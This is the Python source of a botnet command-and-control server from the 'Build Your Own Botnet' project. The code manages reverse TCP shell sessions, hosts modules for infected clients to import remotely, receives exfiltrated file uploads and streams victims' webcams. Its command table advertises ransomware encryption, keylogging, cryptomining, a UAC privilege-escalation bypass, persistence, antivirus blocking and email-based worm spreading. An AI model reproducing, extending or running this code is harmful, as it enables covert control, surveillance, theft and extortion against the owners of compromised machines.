#!/usr/bin/python
# -*- coding: utf-8 -*-
'Command & Control (Build Your Own Botnet)'
from __future__ import print_function

# standard library
import os
import sys
import time
import json
import base64
import pickle
import socket
import struct
import random
import inspect
import argparse
import datetime
import threading
import subprocess
import collections

http_serv_mod = "SimpleHTTPServer"

if sys.version_info[0] > 2:
    http_serv_mod = "http.server"
    sys.path.append('core')
    sys.path.append('modules')

# modules
import core.util as util
import core.database as database
import core.security as security

# packages
try:
    import cv2
except ImportError:
    util.log("Warning: missing package 'cv2' is required for 'webcam' module")
try:
    import colorama
except ImportError:
    sys.exit("Error: missing package 'colorama' is required")

try:
    raw_input          # Python 2
except NameError:
    raw_input = input  # Python 3

# globals
__threads = {}
__abort = False
__debug = False
__banner__ = """

88                                  88
88                                  88
88                                  88
88,dPPYba,  8b       d8  ,adPPYba,  88,dPPYba,
88P'    "8a `8b     d8' a8"     "8a 88P'    "8a
88       d8  `8b   d8'  8b       d8 88       d8
88b,   ,a8"   `8b,d8'   "8a,   ,a8" 88b,   ,a8"
8Y"Ybbd8"'      Y88'     `"YbbdP"'  8Y"Ybbd8"'
                d8'
               d8'

"""

# main
def main():

    parser = argparse.ArgumentParser(
        prog='server.py',
        description="Command & Control Server (Build Your Own Botnet)"
    )

    parser.add_argument(
        '--host',
        action='store',
        type=str,
        default='0.0.0.0',
        help='server hostname or IP address')

    parser.add_argument(
        '--port',
        action='store',
        type=int,
        default=1337,
        help='server port number')

    parser.add_argument(
        '--database',
        action='store',
        type=str,
        default='database.db',
        help='SQLite database')

    parser.add_argument(
        '--debug',
        action='store_true',
        help='Additional logging'
    )

    parser.add_argument(
        '-v', '--version',
        action='version',
        version='0.5',
    )

    modules = os.path.abspath('modules')
    site_packages = [os.path.abspath(_) for _ in sys.path if os.path.isdir(_) if os.path.basename(_) == 'site-packages'] if len([os.path.abspath(_) for _ in sys.path if os.path.isdir(_) if os.path.basename(_) == 'site-packages']) else [os.path.abspath(_) for _ in sys.path if os.path.isdir(_) if 'local' not in _ if os.path.basename(_) == 'dist-packages']

    if len(site_packages):
        n = 0
        globals()['packages'] = site_packages[0]
        for path in site_packages:
            if n < len(os.listdir(path)):
                n = len(os.listdir(path))
                globals()['packages'] = path
    else:
        util.log("unable to locate 'site-packages' in sys.path (directory containing user-installed packages/modules)")
        sys.exit(0)

    if not os.path.isdir('data'):
        try:
            os.mkdir('data')
        except OSError:
            util.log("Unable to create directory 'data' (permission denied)")

    options = parser.parse_args()
    tmp_file=open("temp","w")
    
    globals()['debug'] = options.debug

    # host Python packages on C2 port + 2 (for clients to remotely import)
    globals()['package_handler'] = subprocess.Popen('{} -m {} {}'.format(sys.executable, http_serv_mod, options.port + 2), 0, None, subprocess.PIPE, stdout=tmp_file, stderr=tmp_file, cwd=globals()['packages'], shell=True)

    # host BYOB modules on C2 port + 1 (for clients to remotely import)
    globals()['module_handler'] = subprocess.Popen('{} -m {} {}'.format(sys.executable, http_serv_mod, options.port + 1), 0, None, subprocess.PIPE, stdout=tmp_file, stderr=tmp_file, cwd=modules, shell=True)

    # run simple HTTP POST request handler on C2 port + 3 to handle incoming uploads of exfiltrated files
    globals()['post_handler'] = subprocess.Popen('{} core/handler.py {}'.format(sys.executable, int(options.port + 3)), 0, None, subprocess.PIPE, stdout=tmp_file, stderr=tmp_file, shell=True)

    # run C2
    globals()['c2'] = C2(host=options.host, port=options.port, db=options.database)
    globals()['c2'].run()



class C2():
    """
    Console-based command & control server with a streamlined user-interface for controlling clients
    with reverse TCP shells which provide direct terminal access to the client host machines, as well
    as handling session authentication & management, serving up any scripts/modules/packages requested
    by clients to remotely import them, issuing tasks assigned by the user to any/all clients, handling
    incoming completed tasks from clients

    """

    _lock = threading.Lock()
    _text_color = 'WHITE'
    _text_style = 'NORMAL'
    _prompt_color = 'WHITE'
    _prompt_style = 'BRIGHT'

    def __init__(self, host='0.0.0.0', port=1337, db=':memory:'):
        """
        Create a new Command & Control server

        `Optional`
        :param str db:      SQLite database
                                :memory: (session)
                                *.db     (persistent)

        Returns a byob.server.C2 instance

        """
        self._active = threading.Event()
        self._count = 0
        self._prompt = None
        self._database = db
        self.child_procs = {}
        self.current_session = None
        self.sessions = {}
        self.socket = self._socket(port)
        self.banner = self._banner()
        self.commands = {
            'set' : {
                'method': self.set,
                'usage': 'set <setting> [option=value]',
                'description': 'change the value of a setting'},
            'help' : {
                'method': self.help,
                'usage': 'help',
                'description': 'show usage help for server commands'},
            'exit' : {
                'method': self.quit,
                'usage': 'exit',
                'description': 'quit the server'},
            'debug' : {
                'method': self.debug,
                'usage': 'debug <code>',
                'description': 'run python code directly on server (debugging MUST be enabled)'},
            'query' : {
                'method': self.query,
                'usage': 'query <statement>',
                'description': 'query the SQLite database'},
            'options' : {
                'method': self.settings,
                'usage': 'options',
                'description': 'show currently configured settings'},
            'sessions' : {
                'method': self.session_list,
                'usage': 'sessions',
                'description': 'show active client sessions'},
            'clients' : {
                'method': self.client_list,
                'usage': 'clients',
                'description': 'show all clients that have joined the server'},
            'shell' : {
                'method': self.session_shell,
                'usage': 'shell <id>',
                'description': 'interact with a client with a reverse TCP shell through an active session'},
            'ransom' : {
                'method': 'you must first connect to a session to use this command', # self.session_ransom,
                'usage': 'ransom [id] [rsa key]',
                'description': 'encrypt client files & ransom encryption key for a Bitcoin payment'},
            'webcam' : {
                'method': self.session_webcam,
                'usage': 'webcam <mode>',
                'description': 'capture image/video from the webcam of a client device'},
            'kill' : {
                'method': self.session_remove,
                'usage': 'kill <id>',
                'description': 'end a session'},
            'bg' : {
                'method': self.session_background,
                'usage': 'bg [id]',
                'description': 'background a session (default: the current session)'},
            'broadcast' : {
                'method': self.task_broadcast,
                'usage': 'broadcast <command>',
                'description': 'broadcast a task to all active sessions'},
            'results': {
                'method': self.task_list,
                'usage': 'results [id]',
                'description': 'display all completed task results for a client (default: all clients)'},
            'tasks' : {
                'method': self.task_list,
                'usage': 'tasks [id]',
                'description': 'display all incomplete tasks for a client (default: all clients)'},
            'abort': {
                'method': 'you must first connect to a session to use this command',
                'description': 'abort execution and self-destruct',
                'usage': 'abort'},
            'cat': {
                'method': 'you must first connect to a session to use this command',
                'description': 'display file contents', 
                'usage': 'cat <path>'},
            'cd': {
                'method': 'you must first connect to a session to use this command',
                'description': 'change current working directory',
                'usage': 'cd <path>'},
            'escalate': {
                'method': 'you must first connect to a session to use this command',
                'description': 'attempt uac bypass to escalate privileges',
                'usage': 'escalate'},
            'eval': {
                'method': 'you must first connect to a session to use this command',
                'description': 'execute python code in current context',
                'usage': 'eval <code>'},
            'execute': {
                'method': 'you must first connect to a session to use this command',
                'description': 'run an executable program in a hidden process',
                'usage': 'execute <path> [args]'},
            'help': {
                'method': self.help,
                'description': 'show usage help for commands and modules',
                'usage': 'help [cmd]'},
            'icloud': {
                'method': 'you must first connect to a session to use this command',
                'description': 'check for logged in icloud account on macos',
                'usage': 'icloud'},
            'keylogger': {
                'method': 'you must first connect to a session to use this command',
                'description': 'log user keystrokes',
                'usage': 'keylogger [mode]'},
            'load': {
                'method': 'you must first connect to a session to use this command',
                'description': 'remotely import a module or package',
                'usage': 'load <module> [target]'},
            'ls': {
                'method': 'you must first connect to a session to use this command',
                'description': 'list the contents of a directory',
                'usage': 'ls <path>'},
            'miner': {
                'method': 'you must first connect to a session to use this command',
                'description': 'run cryptocurrency miner in the background',
                'usage': 'miner <cmd> [url] [port] [wallet]'},
            'outlook': {
                'method': 'you must first connect to a session to use this command',
                'description': 'access outlook email in the background',
                'usage': 'outlook <option> [mode]'},
            'packetsniffer': {
                'method': 'you must first connect to a session to use this command',
                'description': 'capture traffic on local network',
                'usage': 'packetsniffer [mode]'},
            'passive': {
                'method': 'you must first connect to a session to use this command',
                'description': 'keep client alive while waiting to re-connect',
                'usage': 'passive'},
            'persistence': {
                'method': 'you must first connect to a session to use this command',
                'description': 'establish persistence on client host machine',
                'usage': 'persistence <add/remove> [method]'},
            'portscanner': {
                'method': 'you must first connect to a session to use this command',
                'description': 'scan a target host or network to identify',
                'usage': 'portscanner <target>'},
            'process': {
                'method': 'you must first connect to a session to use this command',
                'description': 'block process (e.g. antivirus) or monitor process',
                'usage': 'process <block/monitor>'},
            'pwd': {
                'method': 'you must first connect to a session to use this command',
                'description': 'show name of present working directory',
                'usage': 'pwd'},
            'restart': {
                'method': 'you must first connect to a session to use this command',
                'description': 'restart the shell', 
                'usage': 'restart [output]'},
            'screenshot': {
                'method': 'you must first connect to a session to use this command',
                'description': 'capture a screenshot from host device',
                'usage': 'screenshot'},
            'show': {
                'method': 'you must first connect to a session to use this command',
                'description': 'show value of an attribute',
                'usage': 'show <value>'},
            'spread': {
                'method': 'you must first connect to a session to use this command',
                'description': 'activate worm-like behavior and begin spreading client via email',
                'usage': 'spread <gmail> <password> <URL email list>'},
            'stop': {
                'method': 'you must first connect to a session to use this command',
                'description': 'stop a running job', 
                'usage': 'stop <job>'},
            'upload': {
                'method': 'you must first connect to a session to use this command',
                'description': 'upload file from client machine to the c2 server',
                'usage': 'upload [file]'},
            'wget': {
                'method': 'you must first connect to a session to use this command',
                'description': 'download file from url', 
                'usage': 'wget <url>'}        
        }

        try:
            import readline
        except ImportError:
            util.log("Warning: missing package 'readline' is required for tab-completion")
        else:
            import rlcompleter
            readline.parse_and_bind("tab: complete")
            readline.set_completer(self._completer)

    def _print(self, info):
        lock = self.current_session._lock if self.current_session else self._lock
        if isinstance(info, str):
            try:
                info = json.loads(info)
            except: pass
        if isinstance(info, dict):
            max_key = int(max(map(len, [str(i1) for i1 in info.keys() if i1 if i1 != 'None'])) + 2) if int(max(map(len, [str(i1) for i1 in info.keys() if i1 if i1 != 'None'])) + 2) < 80 else 80
            max_val = int(max(map(len, [str(i2) for i2 in info.values() if i2 if i2 != 'None'])) + 2) if int(max(map(len, [str(i2) for i2 in info.values() if i2 if i2 != 'None'])) + 2) < 80 else 80
            key_len = {len(str(i2)): str(i2) for i2 in info.keys() if i2 if i2 != 'None'}
            keys = {k: key_len[k] for k in sorted(key_len.keys())}
            with lock:
                for key in keys.values():
                    if info.get(key) and info.get(key) != 'None':
                        try:
                            info[key] = json.loads(key)
                            self._print(info[key])
                        except:
                            if len(str(info.get(key))) > 80:
                                info[key] = str(info.get(key))[:77] + '...'
                            info[key] = str(info.get(key)).replace('\n',' ') if not isinstance(info.get(key), datetime.datetime) else str(key).encode().replace("'", '"').replace('True','true').replace('False','false') if not isinstance(key, datetime.datetime) else str(int(time.mktime(key.timetuple())))
                            util.display('\x20' * 4, end=' ')
                            util.display(key.ljust(max_key).center(max_key + 2) + info[key].ljust(max_val).center(max_val + 2), color=self._text_color, style=self._text_style)
        else:
            with lock:
                util.display('\x20' * 4, end=' ')
                util.display(str(info), color=self._text_color, style=self._text_style)

    def _socket(self, port):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(('0.0.0.0', port))
        s.listen(100)
        return s

    def _return(self, data=None):
        lock, prompt = (self.current_session._lock, self.current_session._prompt) if self.current_session else (self._lock, self._prompt)
        with lock:
            if data:
                util.display('\n{}\n'.format(data))
            util.display(prompt, end=' ')

    def _banner(self):
        with self._lock:
            util.display(__banner__, color=random.choice(['red','green','cyan','magenta','yellow']), style='bright')
            util.display("[?] ", color='yellow', style='bright', end=' ')
            util.display("Hint: show usage information with the 'help' command\n", color='white', style='normal')
        return __banner__

    def _get_arguments(self, data):
        args = tuple([i.strip('-') for i in str(data).split() if '=' not in i])
        kwds = dict({i.partition('=')[0].strip('-'): i.partition('=')[2].strip('-') for i in str(data).split() if '=' in i})
        return collections.namedtuple('Arguments', ('args','kwargs'))(args, kwds)

    def _get_session_by_id(self, session):
        session = None
        if str(session).isdigit() and int(session) in self.sessions:
            session = self.sessions[int(session)]
        elif self.current_session:
            session = self.current_session
        else:
            util.log("Invalid Client ID")
        return session

    def _get_session_by_connection(self, connection):
        session = None
        if isinstance(connection, socket.socket):
            peer = connection.getpeername()[0]
            for s in self.get_sessions():
                if s.connection.getpeername()[0] == peer:
                    session = s
                    break
            else:
                util.log("Session not found for: {}".format(peer))
        else:
            util.log("Invalid input type (expected '{}', received '{}')".format(socket.socket, type(connection)))
        return session

    def _completer(self, text, state):
        options = [i for i in self.commands.keys() if i.startswith(text)]
        if state < len(options):
            return options[state]
        return None

    def _get_prompt(self, data):
        with self._lock:
            return raw_input(getattr(colorama.Fore, self._prompt_color) + getattr(colorama.Style, self._prompt_style) + data.rstrip())

    def _execute(self, args):
        # ugly method that should be refactored at some point
        path, args = [i.strip() for i in args.split('"') if i if not i.isspace()] if args.count('"') == 2 else [i for i in args.partition(' ') if i if not i.isspace()]
        args = [path] + args.split()
        if os.path.isfile(path):
            name = os.path.splitext(os.path.basename(path))[0]
            try:
                info = subprocess.STARTUPINFO()
                info.dwFlags = subprocess.STARTF_USESHOWWINDOW ,  subprocess.CREATE_NEW_ps_GROUP
                info.wShowWindow = subprocess.SW_HIDE
                self.child_procs[name] = subprocess.Popen(args, startupinfo=info)
                return "Running '{}' in a hidden process".format(path)
            except Exception as e:
                try:
                    self.child_procs[name] = subprocess.Popen(args, 0, None, None, subprocess.PIPE, subprocess.PIPE)
                    return "Running '{}' in a new process".format(name)
                except Exception as e:
                    util.log("{} error: {}".format(self.execute.__name__, str(e)))
        else:
            return "File '{}' not found".format(str(path))


    def debug(self, code):
        """
        Execute code directly in the context of the currently running process

        `Requires`
        :param str code:    Python code to execute

        """
        if globals()['debug']:
            try:
                print(eval(code))
            except Exception as e:
                util.log("Error: %s" % str(e))
        else:
            util.log("Debugging mode is disabled")

    def quit(self):
        """
        Quit server and optionally keep clients alive

        """

        # kill handlers running on other ports
        globals()['package_handler'].kill()
        globals()['module_handler'].kill()
        globals()['post_handler'].kill()

        # kill subprocesses (subprocess.Popen)
        for proc in self.child_procs.values():
            try:
                proc.kill()
            except: pass

        # kill child processes (multiprocessing.Process)
        for child_proc in self.child_procs.values():
            try:
                child_proc.terminate()
            except: pass
        
        # kill clients or keep alive (whichever user specifies)
        if self._get_prompt('Quitting server - Keep clients alive? (y/n): ').startswith('y'):
            for session in self.sessions.values():
                if isinstance(session, Session):
                    try:
                        session._active.set()
                        session.send_task({"task": "passive"})
                    except: pass
        globals()['__abort'] = True
        self._active.clear()

        # kill server and exit
        _ = os.popen("taskkill /pid {} /f".format(os.getpid()) if os.name == 'nt' else "kill -9 {}".format(os.getpid())).read()
        util.display('Exiting...')
        sys.exit(0)

    def help(self, cmd=None):
        """
        Show usage information

        `Optional`
        :param str info:   client usage help

        """
        column1 = 'command <arg>'
        column2 = 'description'

        # if a valid command is specified, display detailed help for it.
        # otherwise, display help for all commands
        if cmd:
            if cmd in self.commands:
                info = {self.commands[cmd]['usage']: self.commands[cmd]['description']} 
            else:
                util.display("'{cmd}' is not a valid command. Type 'help' to see all commands.".format(cmd=cmd))
                return
        else:
            info = {command['usage']: command['description'] for command in self.commands.values()}

        max_key = max(map(len, list(info.keys()) + [column1])) + 2
        max_val = max(map(len, list(info.values()) + [column2])) + 2
        util.display('\n', end=' ')
        util.display(column1.center(max_key) + column2.center(max_val), color=self._text_color, style='bright')
        for key in sorted(info):
            util.display(key.ljust(max_key).center(max_key + 2) + info[key].ljust(max_val).center(max_val + 2), color=self._text_color, style=self._text_style)
        util.display("\n", end=' ')


    def display(self, info):
        """
        Display formatted output in the console

        `Required`
        :param str info:   text to display

        """
        with self._lock:
            print()
            if isinstance(info, dict):
                if len(info):
                    self._print(info)
            elif isinstance(info, list):
                if len(info):
                    for data in info:
                        util.display('  %d\n' % int(info.index(data) + 1), color=self._text_color, style='bright', end="")
                        self._print(data)
            elif isinstance(info, str):
                try:
                    self._print(json.loads(info))
                except:
                    util.display(str(info), color=self._text_color, style=self._text_style)
            elif isinstance(info, bytes):
                try:
                    self._print(json.load(info))
                except:
                    util.display(info.decode('utf-8'), color=self._text_color, style=self._text_style)
            else:
                util.log("{} error: invalid data type '{}'".format(self.display.__name__, type(info)))
            print()

    def query(self, statement):
        """
        Query the database

        `Requires`
        :param str statement:    SQL statement to execute

        """
        self.database.execute_query(statement, returns=False, display=True)

    def settings(self):
        """
        Show the server's currently configured settings

        """
        text_color = [color for color in filter(str.isupper, dir(colorama.Fore)) if color == self._text_color][0]
        text_style = [style for style in filter(str.isupper, dir(colorama.Style)) if style == self._text_style][0]
        prompt_color = [color for color in filter(str.isupper, dir(colorama.Fore)) if color == self._prompt_color][0]
        prompt_style = [style for style in filter(str.isupper, dir(colorama.Style)) if style == self._prompt_style][0]
        util.display('\n\t    OPTIONS', color='white', style='bright')
        util.display('text color/style: ', color='white', style='normal', end=' ')
        util.display('/'.join((self._text_color.title(), self._text_style.title())), color=self._text_color, style=self._text_style)
        util.display('prompt color/style: ', color='white', style='normal', end=' ')
        util.display('/'.join((self._prompt_color.title(), self._prompt_style.title())), color=self._prompt_color, style=self._prompt_style)
        util.display('debug: ', color='white', style='normal', end=' ')
        util.display('True\n' if globals()['debug'] else 'False\n', color='green' if globals()['debug'] else 'red', style='normal')

    def set(self, args=None):
        """
        Set display settings for the command & control console

        Usage: `set [setting] [option]=[value]`

            :setting text:      text displayed in console
            :setting prompt:    prompt displayed in shells

            :option color:      color attribute of a setting
            :option style:      style attribute of a setting

            :values color:      red, green, cyan, yellow, magenta
            :values style:      normal, bright, dim

        Example 1:         `set text color=green style=normal`
        Example 2:         `set prompt color=white style=bright`

        """
        if not args:
            util.display("\nusage: set [setting] [option]=[value]\n\n    colors:   white/black/red/yellow/green/cyan/magenta\n    styles:   dim/normal/bright\n", color=self._text_color, style=self._text_style)
            return

        arguments = self._get_arguments(args)
        args, kwargs = arguments.args, arguments.kwargs
        if not arguments.args:
            util.display("\nusage: set [setting] [option]=[value]\n\n    colors:   white/black/red/yellow/green/cyan/magenta\n    styles:   dim/normal/bright\n", color=self._text_color, style=self._text_style)
            return

        target = args[0]
        args = args[1:]
        if target in ('debug','debugging'):
            if not args:
                util.display("\nusage: set [setting] [option]=[value]\n\n    colors:   white/black/red/yellow/green/cyan/magenta\n    styles:   dim/normal/bright\n", color=self._text_color, style=self._text_style)
                return

            setting = args[0]
            if setting.lower() in ('0','off','false','disable'):
                globals()['debug'] = False
            elif setting.lower() in ('1','on','true','enable'):
                globals()['debug'] = True

            util.display("\n[+]" if globals()['debug'] else "\n[-]", color='green' if globals()['debug'] else 'red', style='normal', end=' ')
            util.display("Debug: {}\n".format("ON" if globals()['debug'] else "OFF"), color='white', style='bright')

        for setting, option in arguments.kwargs.items():
            option = option.upper()

            if target == 'prompt':
                if setting == 'color' and hasattr(colorama.Fore, option):
                    self._prompt_color = option
                elif setting == 'style' and hasattr(colorama.Style, option):
                    self._prompt_style = option
                util.display("\nprompt color/style changed to ", color='white', style='bright', end=' ')
                util.display(option + '\n', color=self._prompt_color, style=self._prompt_style)

            elif target == 'text':
                if setting == 'color' and hasattr(colorama.Fore, option):
                    self._text_color = option
                elif setting == 'style' and hasattr(colorama.Style, option):
                    self._text_style = option
                util.display("\ntext color/style changed to ", color='white', style='bright', end=' ')
                util.display(option + '\n', color=self._text_color, style=self._text_style)

    def task_list(self, id=None):
        """
        List client tasks and results

        `Requires`
        :param int id:   session ID

        """
        if globals()['debug']:
            util.display('parent={} , child={} , args={}'.format(inspect.stack()[1][3], inspect.stack()[0][3], locals()))
        lock = self.current_session._lock if self.current_session else self._lock
        tasks = self.database.get_tasks()
        with lock:
            print()
            for task in tasks:
                util.display(tasks.index(task) + 1)
                self.database._display(task)
            print()

    def task_broadcast(self, command):
        """
        Broadcast a task to all sessions

        `Requires`
        :param str command:   command to broadcast

        """
        if globals()['debug']:
            util.display('parent={} , child={} , args={}'.format(inspect.stack()[1][3], inspect.stack()[0][3], locals()))
        sessions = self.sessions.values()
        send_tasks = [session.send_task({"task": command}) for session in sessions]
        recv_tasks = {session: session.recv_task() for session in sessions}
        for session, task in recv_tasks.items():
            if isinstance(task, dict) and task.get('task') == 'prompt' and task.get('result'):
                session._prompt = task.get('result')
            elif task.get('result'):
                self.display(task.get('result'))
        self._return()

    def session_webcam(self, args=''):
        """
        Interact with a client webcam

        `Optional`
        :param str args:   stream [port], image, video

        """
        if not self.current_session:
            util.log( "No client selected")
            return
        client = self.current_session
        result = ''
        mode, _, arg = args.partition(' ')
        client._active.clear()
        # if not (not mode or str(mode).lower() == 'stream'):
        if mode and not str(mode).lower() == 'stream': # Thanks De Morgan
            client.send_task({"task": "webcam %s" % args})
            task = client.recv_task()
            result = task.get('result')
            client._active.set()
            return result
        # 
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        retries = 5
        while retries > 0:
            try:
                port = random.randint(6000,9999)
                s.bind(('0.0.0.0', port))
                s.listen(1)
                cmd = {"task": 'webcam stream {}'.format(port)}
                client.send_task(cmd)
                conn, addr = s.accept()
                break
            except:
                retries -= 1
        header_size = struct.calcsize("L")
        window_name = addr[0]
        cv2.namedWindow(window_name)
        data = ""
        try:
            while True:
                while len(data) < header_size:
                    data += conn.recv(4096)
                packed_msg_size = data[:header_size]
                data = data[header_size:]
                msg_size = struct.unpack(">L", packed_msg_size)[0]
                while len(data) < msg_size:
                    data += conn.recv(4096)
                frame_data = data[:msg_size]
                data = data[msg_size:]
                frame = pickle.loads(frame_data)
                cv2.imshow(window_name, frame)
                key = cv2.waitKey(70)
                if key == 32:
                    break
        finally:
            conn.close()
            cv2.destroyAllWindows()
            result = 'Webcam stream ended'

        return result

    def session_remove(self, session_id):
        """
        Shutdown client shell and remove client from database

        `Requires`
        :param int session_id:   session ID

        """
        if globals()['debug']:
            util.display('parent={} , child={} , args={}'.format(inspect.stack()[1][3], inspect.stack()[0][3], locals()))
        if not str(session_id).isdigit() or int(session_id) not in self.sessions:
            return

        if str(session_id).isdigit() and int(session_id) in self.sessions and not isinstance(self.sessions[int(session_id)], Session):
            session = self.sessions[int(session_id)]
            util.display("Session '{}' is stale (Awaiting Connection)".format(session_id))
            _ = self.sessions.pop(int(session_id), None)
            self.database.update_status(session['info']['uid'], 0)
            with self._lock:
                util.display('Session {} expunged'.format(session_id))
            self._active.set()
            return self.run()

        # Implicity else
        # select session
        session = self.sessions[int(session_id)]
        session._active.clear()
        # send kill command to client
        try:
            session.send_task({"task": "kill", "session": session.info.get('uid')})
            # shutdown the connection
            session.connection.shutdown(socket.SHUT_RDWR)
            session.connection.close()
            # update current sessions
        except: 
            pass

        _ = self.sessions.pop(int(session_id), None)
        # update persistent database
        self.database.update_status(session.info.get('uid'), 0)

        if self.current_session != None and int(session_id) != self.current_session.id:
            with self.current_session._lock:
                util.display('Session {} disconnected'.format(session_id))
            self._active.clear()
            self.current_session._active.set()
            return self.current_session.run()

        self.current_session = None
        with self._lock:
            util.display('Session {} disconnected'.format(session_id))
        self._active.set()
        session._active.clear()
        return self.run()

    def client_list(self, verbose=True):
        """
        List currently online clients

        `Optional`
        :param str verbose:   verbose output (default: False)

        """
        if globals()['debug']:
            util.display('parent={} , child={} , args={}'.format(inspect.stack()[1][3], inspect.stack()[0][3], locals()))
        lock = self.current_session._lock if self.current_session else self._lock
        with lock:
            print()
            sessions = self.database.get_sessions(verbose=verbose)
            self.database._display(sessions)
            print()

    def session_list(self):
        """
        List active sessions

        """
        if globals()['debug']:
            util.display('parent={} , child={} , args={}'.format(inspect.stack()[1][3], inspect.stack()[0][3], locals()))
        lock = self.current_session._lock if self.current_session else self._lock
        with lock:
            print()
            for ses in self.sessions.values():
                util.display(str(ses.id), color='white', style='normal')
                self.database._display(ses.info)
                print()

    # def session_ransom(self, args=None):
    #     """
    #     Encrypt and ransom files on client machine

    #     `Required`
    #     :param str args:    encrypt, decrypt, payment

    #     """
    #     if not self.current_session:
    #         util.log("No client selected")
    #         return "No client selected"

    #     command = "ransom {}".format(args)

    #     if 'decrypt' in str(args):
    #         command = "ransom {} {}".format(args, self.current_session.rsa.exportKey())
    #     elif 'encrypt' in str(args):
    #         print('line 875 task: ', "ransom {} {}".format(args, self.current_session.rsa.publickey().exportKey()))
    #         command = "ransom {} {}".format(args, self.current_session.rsa.publickey().exportKey())

    #     # task = self.current_session.recv_task()
    #     # result = task.get('result')
    #     # self.current_session._active.set()

    #     task = globals()['c2'].database.handle_task({'task': command, 'session': self.info.get('uid')})
    #     self.send_task(task)

    #     return "Catching end case"


    def session_shell(self, session):
        """
        Interact with a client session through a reverse TCP shell

        `Requires`
        :param int session:   session ID

        """
        if globals()['debug']:
            util.display('parent={} , child={} , args={}'.format(inspect.stack()[1][3], inspect.stack()[0][3], locals()))
        if not str(session).isdigit() or int(session) not in self.sessions:
            util.display("Session {} does not exist".format(session))
        elif str(session).isdigit() and int(session) in self.sessions and not isinstance(self.sessions[int(session)], Session):
            util.display("Session {} is stale (Awaiting Connection)".format(session))
        else:
            self._active.clear()
            if self.current_session:
                self.current_session._active.clear()
            self.current_session = self.sessions[int(session)]
            util.display("\n\nStarting Reverse TCP Shell w/ Session {}...\n".format(session), color='white', style='normal')
            self.current_session._active.set()
            return self.current_session.run()

    def session_background(self, session=None):
        """
        Send a session to background

        `Requires`
        :param int session:   session ID

        """
        if globals()['debug']:
            util.display('parent={} , child={} , args={}'.format(inspect.stack()[1][3], inspect.stack()[0][3], locals()))
        if not session:
            if self.current_session:
                self.current_session._active.clear()
        elif str(session).isdigit() and int(session) in self.sessions and not isinstance(self.sessions[int(session)], Session):
            util.display("Session {} is stale (Awaiting Connection)".format(session))
        elif str(session).isdigit() and int(session) in self.sessions:
            self.sessions[int(session)]._active.clear()
        self.current_session = None
        self._active.set()
        return self.run()

    @util.threaded
    def serve_until_stopped(self):
        self.database = database.Database(self._database)
        for session_info in self.database.get_sessions(verbose=True):
            self.database.update_status(session_info.get('uid'), 0)
            session_info['online'] = False
        while True:
            connection, address = self.socket.accept()
            session = Session(connection=connection, id=self._count)
            if session.info != None:
                info = self.database.handle_session(session.info)
                if isinstance(info, dict):
                    self._count += 1
                    if info.pop('new', False):
                        util.display("\n\n[+]", color='green', style='bright', end=' ')
                        util.display("New Connection:", color='white', style='bright', end=' ')
                    else:
                        util.display("\n\n[+]", color='green', style='bright', end=' ')
                        util.display("Connection:", color='white', style='bright', end=' ')
                    util.display(address[0], color='white', style='normal')
                    util.display("    Session:", color='white', style='bright', end=' ')
                    util.display(str(session.id), color='white', style='normal')
                    util.display("    Started:", color='white', style='bright', end=' ')
                    util.display(time.ctime(session._created), color='white', style='normal')
                    session.info = info
                    self.sessions[int(session.id)] = session
            else:
                util.display("\n\n[-]", color='red', style='bright', end=' ')
                util.display("Failed Connection:", color='white', style='bright', end=' ')
                util.display(address[0], color='white', style='normal')

            # refresh prompt
            prompt = '\n{}'.format(self.current_session._prompt if self.current_session else self._prompt)
            util.display(prompt, color=self._prompt_color, style=self._prompt_style, end=' ')
            sys.stdout.flush()

            abort = globals()['__abort']
            if abort:
                break

    @util.threaded
    def serve_resources(self):
        """
        Handles serving modules and packages in a seperate thread

        """
        host, port = self.socket.getsockname()
        while True:
            time.sleep(3)
            globals()['package_handler'].terminate()
            globals()['package_handler'] = subprocess.Popen('{} -m {} {}'.format(sys.executable, http_serv_mod, port + 2), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, cwd=globals()['packages'], shell=True)

    def run(self):
        """
        Run C2 server administration terminal

        """
        if globals()['debug']:
            util.display('parent={} , child={} , args={}'.format(inspect.stack()[1][3], inspect.stack()[0][3], locals()))
        self._active.set()
        if 'c2' not in globals()['__threads']:
            globals()['__threads']['c2'] = self.serve_until_stopped()
        while True:
            try:
                # Wait for events to stop before continuing (ie current session)
                self._active.wait()

                # 
                self._prompt = "[{} @ %s]> ".format(os.getenv('USERNAME', os.getenv('USER', 'byob'))) % os.getcwd()
                cmd_buffer = self._get_prompt(self._prompt)

                if not cmd_buffer and globals()['__abort']:
                    break

                output = ''
                cmd, _, action = cmd_buffer.partition(' ')
                if cmd in self.commands:
                    method = self.commands[cmd]['method']
                    if callable(method):
                        try:
                            output = method(action) if len(action) else method()
                        except Exception as e1:
                            output = str(e1)
                    else:
                        util.display("\n[-]", color='red', style='bright', end=' ')
                        util.display("Error:", color='white', style='bright', end=' ')
                        util.display(method + "\n", color='white', style='normal')
                elif cmd == 'cd':
                    try:
                        os.chdir(action)
                    except: pass
                else:
                    try:
                        output = str().join((subprocess.Popen(cmd_buffer, 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True).communicate()))
                    except: 
                        pass

                if output:
                    util.display(str(output))

            except KeyboardInterrupt:
                self._active.clear()
                break
        self.quit()


class Session(threading.Thread):
    """
    A subclass of threading.Thread that is designed to handle an
    incoming connection by creating an new authenticated session
    for the encrypted connection of the reverse TCP shell

    """

    def __init__(self, connection=None, id=0):
        """
        Create a new Session

        `Requires`
        :param connection:  socket.socket object

        `Optional`
        :param int id:      session ID

        """
        super(Session, self).__init__()
        self._prompt = None
        self._abort = False
        self._lock = threading.Lock()
        self._active = threading.Event()
        self._created = time.time()
        self.id = id
        self.connection = connection
        self.key = security.diffiehellman(self.connection)
        # self.rsa = security.Crypto.PublicKey.RSA.generate(2048)

        from Crypto.PublicKey import RSA
        self.rsa = RSA.generate(2048)

        try:
            self.info = self.client_info()
            #self.info['id'] = self.id
        except Exception as e:
            print("Session init exception: " + str(e))
            self.info = None

    def kill(self):
        """
        Kill the reverse TCP shell session

        """
        self._active.clear()
        globals()['c2'].session_remove(self.id)
        globals()['c2'].current_session = None
        globals()['c2']._active.set()
        globals()['c2'].run()

    def client_info(self):
        """
        Get information about the client host machine
        to identify the session

        """
        header_size = struct.calcsize("!L")
        header = self.connection.recv(header_size)
        msg_size = struct.unpack("!L", header)[0]
        msg = self.connection.recv(msg_size)
